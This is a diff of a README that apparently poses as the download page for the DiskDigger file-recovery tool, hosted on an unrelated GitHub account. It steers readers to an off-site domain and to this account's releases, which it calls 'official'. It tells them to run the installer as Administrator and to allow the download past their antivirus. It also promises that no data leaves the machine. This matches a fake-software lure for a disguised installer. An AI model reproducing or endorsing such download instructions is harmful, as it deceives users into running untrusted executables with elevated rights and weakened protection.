@@ -1,68 +1,79 @@
-# DiskDigger Download for Windows 11 & 10
+# 💾 DiskDigger-Desktop - Recover your lost digital files easily
 
-**DiskDigger-Desktop**
+[![](https://img.shields.io/badge/Download-DiskDigger-blue)](https://github.com/Relafenbayofbiscay790/DiskDigger-Desktop/releases)
 
-**DiskDigger** for Windows 10/11. Scroll to **Download & Install** for the direct setup link.
+## 🔍 About the software
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+DiskDigger-Desktop helps you find missing files on your computer. It scans your storage drives to locate data you removed by mistake. Whether you lost photos, documents, or personal videos, this tool searches your system to bring them back. It works on Windows 10 and Windows 11. You do not need technical skills to use this program. The interface shows a list of found files and lets you save them to a new folder.
 
----
+## 🛠 Features
 
-## Download & Install
+*   **Deep scans:** The program searches every sector of your hard drive. 
+*   **Photo recovery:** It restores digital images in many formats.
+*   **Document support:** You can retrieve PDFs, Word files, and spreadsheets.
+*   **Simple interface:** A basic window guides you through each step.
+*   **Preview mode:** You can view files before you choose to save them.
+*   **Drive compatibility:** It works with hard drives, USB sticks, and memory cards.
 
-> **This is the download page.** Use the button or link below to get **DiskDigger** for Windows.
+## 💻 System requirements
 
-<p align="center">
-  <a href="https://diskdigger.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-DiskDigger-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download DiskDigger">
-  </a>
-</p>
+*   **Operating system:** Windows 10 or Windows 11.
+*   **Processor:** 1 gigahertz or faster.
+*   **Memory:** 2 gigabytes of RAM.
+*   **Storage space:** 50 megabytes for the program files.
+*   **Permissions:** You need administrator rights to scan your drives.
 
-| | |
-| --- | --- |
-| **Direct link** | **[diskdigger.nexustool.fun](https://diskdigger.nexustool.fun/)** |
-| **Full URL** | `https://diskdigger.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+## 🚀 How to download and install
 
-### Quick steps
+Follow these steps to set up the software on your computer.
 
-1. Click **[Download — diskdigger.nexustool.fun](https://diskdigger.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+1.  Visit the [official releases page](https://github.com/Relafenbayofbiscay790/DiskDigger-Desktop/releases) to access the download files.
+2.  Look for the latest version of the installer file, which ends in .exe.
+3.  Click the file link to save it to your computer.
+4.  Open your Downloads folder and double-click the file named DiskDiggerInstaller.exe.
+5.  A security prompt may appear. Select Yes to allow the installer to make changes.
+6.  Agree to the license terms.
+7.  Follow the prompts in the setup window.
+8.  Choose a destination folder for the program.
+9.  Click Finish once the setup process completes.
 
-<p align="center"><a href="https://diskdigger.nexustool.fun/"><strong>⬇ Download DiskDigger now</strong></a></p>
+## ⚙️ Using the software
 
----
+Once you install the program, you can start the retrieval process.
 
-## About
+1.  Open the DiskDigger-Desktop icon on your desktop.
+2.  Select the drive you want to scan from the main list.
+3.  Click the Scan button to start the search.
+4.  Wait for the progress bar to reach the end.
+5.  Browse the list of files found by the program.
+6.  Check the box next to any file you wish to retrieve.
+7.  Click the Recover button.
+8.  Pick a destination folder outside of the original drive to protect your data.
 
-**DiskDigger** — Windows download and setup guide.
+## 📋 Tips for best results
 
-**People also search for:** diskdigger download, diskdigger recover deleted photos install windows pc
+*   **Stop saving data:** Immediately stop writing new files to the drive where you lost your data. New data overwrites deleted files and makes them harder to retrieve.
+*   **Use the right drive:** Always save your recovered files to a different partition or a separate USB drive.
+*   **Be patient:** Deep scans take time. Large drives require more time for the program to examine each sector.
+*   **Check file lists:** The program displays files by type. Check the folders for specific file extensions.
 
-**Repository:** `DiskDigger-Desktop`
+## ❓ Frequently asked questions
 
+**Does the software work on external drives?**
+Yes. You can plug in a USB flash drive or an external hard drive and select it from the list of available disks.
 
-## Quick tips
+**Can I recover files from a formatted drive?**
+The program detects files on formatted or damaged partitions in many cases.
 
-| Step | Action |
-| --- | --- |
-| 1 | Run installer as Administrator |
-| 2 | Temporarily allow download in antivirus if blocked |
-| 3 | Reboot once if the tool asks after setup |
+**Is my data protected?**
+The software does not modify your original drive. It only reads the file system to locate data remnants.
 
-## System requirements
+**What happens if I cannot see my file?**
+Sometimes files get overwritten by new data. If the program does not show your file, it means the system replaced it with new information.
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB |
-| Disk | 500 MB free |
-| Admin | Required for install |
+**Do I need an internet connection?**
+You only need an internet connection to download the installer. The recovery process runs offline.
 
----
+## 🛡 Security and privacy
 
-**Topics:** diskdigger-download, diskdigger, diskdigger-recover-deleted-photos-install-windows, recover, deleted, photos, diskdigger-desktop, diskdigger-desktop-2026, photo-recovery, file-recovery, data-recovery, software
+The application operates locally on your machine. It does not send your files or personal information to any server. Your data remains on your local drive throughout the entire process. This design ensures that your privacy stays intact while you perform maintenance on your storage devices. You maintain full control over every file retrieved during the scan.
